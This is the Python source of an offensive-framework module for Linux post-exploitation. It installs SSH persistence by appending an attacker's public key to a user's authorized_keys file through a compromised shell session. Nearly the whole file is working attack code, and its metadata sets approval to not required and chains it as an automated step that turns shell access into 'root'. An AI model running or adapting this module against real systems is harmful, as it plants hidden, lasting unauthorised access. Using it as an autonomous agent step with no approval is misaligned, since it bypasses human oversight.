#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.post.linux.persistence_helpers import LinuxPersistenceMixin, PERSISTENCE_AGENT


class Module(Post, LinuxPersistenceMixin):
    __info__ = {
        "name": "SSH authorized_keys Persistence",
        "description": (
            "Adds an SSH public key to authorized_keys for persistent key-based access. "
            "Optionally prefixes command= restrictions."
        ),
        "author": "KittySploit Team",
        "platform": Platform.LINUX,
        "session_type": [SessionType.SHELL, SessionType.METERPRETER, SessionType.SSH],
        "tags": ["persistence", "ssh", "authorized_keys", "linux"],
        "references": ["https://attack.mitre.org/techniques/T1098/004/"],
    'agent': {
        'risk': '',
        'effects': [],
        'expected_requests': 1,
        'reversible': True,
        'approval_required': False,
        'produces': [],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': ['shell'],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'root', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    pubkey = OptString("", "SSH public key line to install (required)", True)
    auth_keys_path = OptString(
        "",
        "Path to authorized_keys (empty = ~/.ssh/authorized_keys of session user)",
        False,
    )
    target_user = OptString("", "Target user home (empty = current session user)", False)
    command_prefix = OptString(
        "",
        "Optional command= restriction prefix before the key (advanced)",
        False,
        advanced=True,
    )
    create_ssh_dir = OptBool(True, "Create ~/.ssh with mode 700 if missing", False)

    def _authorized_keys_path(self) -> str:
        custom = self._opt(self.auth_keys_path)
        if custom:
            return custom
        user = self._opt(self.target_user)
        if user:
            return f"/home/{user}/.ssh/authorized_keys" if user != "root" else "/root/.ssh/authorized_keys"
        home = self.linux_execute('echo "$HOME"').strip() or "/root"
        return f"{home}/.ssh/authorized_keys"

    def _ssh_dir(self) -> str:
        return self._authorized_keys_path().rsplit("/", 1)[0]

    def _build_line(self) -> str:
        key = self._opt(self.pubkey).strip()
        if not key:
            raise ProcedureError(FailureType.ConfigurationError, "pubkey is required")
        prefix = self._opt(self.command_prefix).strip()
        if prefix:
            if not prefix.endswith(" "):
                prefix += " "
            return f'{prefix}{key}\n'
        return f"{key}\n"

    def check(self):
        path = self._authorized_keys_path()
        ssh_dir = self._ssh_dir()
        if self.file_exist(path):
            if not self._is_writable(path):
                print_error(f"{path} exists but is not writable")
                return False
        elif not self._is_writable(ssh_dir):
            if not self.create_ssh_dir:
                print_error(f"SSH directory not writable: {ssh_dir}")
                return False
        if not self._opt(self.pubkey):
            print_error("pubkey is required")
            return False
        print_success(f"authorized_keys target OK: {path}")
        return True

    def run(self):

        if not self.linux_require_linux():
            return False

        if not self.check():
            return False

        path = self._authorized_keys_path()
        ssh_dir = self._ssh_dir()
        line = self._build_line()

        if self.create_ssh_dir:
            self.linux_execute(f"mkdir -p {ssh_dir} && chmod 700 {ssh_dir}")

        if self.file_exist(path):
            self._maybe_backup(path, "authorized_keys")
            existing = self.read_file(path)
            key_token = self._opt(self.pubkey).split()[-1][:32]
            if key_token and key_token in (existing or ""):
                print_warning("Key fingerprint already present in authorized_keys")
                return True

        print_status(f"Appending key to {path}")
        if not self._append_remote_line(path, line.strip()):
            raise ProcedureError(FailureType.PayloadFailed, f"Cannot write {path}")
        self.linux_execute(f"chmod 600 {path} 2>/dev/null")

        print_good("SSH authorized_keys persistence installed.")
        return True
